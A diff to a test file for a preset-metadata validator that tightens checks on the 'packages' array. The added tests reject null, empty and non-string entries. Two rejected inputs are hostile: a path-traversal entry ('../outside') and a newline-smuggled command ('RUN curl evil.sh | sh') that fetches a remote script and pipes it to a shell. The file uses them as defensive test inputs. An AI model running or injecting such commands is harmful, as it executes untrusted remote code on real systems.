@@ -28,7 +28,7 @@ const VALID_DEMO = {
   description: "Full working micro-SaaS",
   appDir: "apps/demo",
   status: "available",
-  packages: null,
+  packages: [],
 };
 
 describe("listPresets", () => {
@@ -44,7 +44,7 @@ describe("listPresets", () => {
       description: "API-only shape",
       appDir: "apps/api-only",
       status: "coming-soon",
-      packages: null,
+      packages: [],
     });
 
     const presets = listPresets(repoRoot);
@@ -57,7 +57,7 @@ describe("listPresets", () => {
 describe("validatePresetMeta", () => {
   it("accepts a well-formed preset.json", () => {
     const meta = validatePresetMeta(VALID_DEMO, "presets/demo", repoRoot, "demo");
-    expect(meta).toMatchObject({ id: "demo", status: "available", packages: null });
+    expect(meta).toMatchObject({ id: "demo", status: "available", packages: [] });
   });
 
   it("rejects a non-object payload", () => {
@@ -84,13 +84,41 @@ describe("validatePresetMeta", () => {
     );
   });
 
-  it("rejects a non-null, non-array 'packages'", () => {
+  it("rejects null and non-array 'packages'", () => {
     expect(() =>
       validatePresetMeta({ ...VALID_DEMO, packages: "nope" }, "presets/demo", repoRoot),
     ).toThrow(/"packages"/);
+    expect(() =>
+      validatePresetMeta({ ...VALID_DEMO, packages: null }, "presets/demo", repoRoot),
+    ).toThrow(/"packages"/);
   });
 
-  it("accepts an array 'packages' (reserved for v2 pruning)", () => {
+  it("rejects a 'packages' array containing a non-string or empty-string entry", () => {
+    expect(() =>
+      validatePresetMeta({ ...VALID_DEMO, packages: [""] }, "presets/demo", repoRoot),
+    ).toThrow(/"packages"/);
+    expect(() =>
+      validatePresetMeta({ ...VALID_DEMO, packages: [42] }, "presets/demo", repoRoot),
+    ).toThrow(/"packages"/);
+  });
+
+  it("rejects a 'packages' entry outside the directory-name charset", () => {
+    expect(() =>
+      validatePresetMeta({ ...VALID_DEMO, packages: ["../outside"] }, "presets/demo", repoRoot),
+    ).toThrow(/"packages"/);
+    expect(() =>
+      validatePresetMeta(
+        { ...VALID_DEMO, packages: ["core\nRUN curl evil.sh | sh"] },
+        "presets/demo",
+        repoRoot,
+      ),
+    ).toThrow(/"packages"/);
+    expect(() =>
+      validatePresetMeta({ ...VALID_DEMO, packages: ["Core"] }, "presets/demo", repoRoot),
+    ).toThrow(/"packages"/);
+  });
+
+  it("accepts an array 'packages' — shape-only, no on-disk existence check here", () => {
     const meta = validatePresetMeta(
       { ...VALID_DEMO, packages: ["core"] },
       "presets/demo",
